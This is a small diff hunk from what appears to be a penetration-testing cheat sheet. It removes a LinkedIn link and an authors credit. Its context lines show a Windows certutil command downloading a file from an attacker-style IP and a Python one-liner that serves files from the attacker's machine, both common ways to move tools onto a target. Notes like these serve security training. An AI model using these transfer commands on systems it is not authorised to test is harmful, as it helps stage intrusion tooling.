@@ -339,7 +339,4 @@ certutil.exe --urlcache -f http://10.10.10.10/file.txt file.txt
 python3 -m http.server --bind [your_ip] [port]
 ```
 
-# Result
-[Click me!](https://www.linkedin.com/posts/dr4ks_pjpt-tcmsecurity-activity-7096676619943034880-t1mH/)
-## Authors
-- [@dr4ks](https://www.github.com/Dr4ks)
+
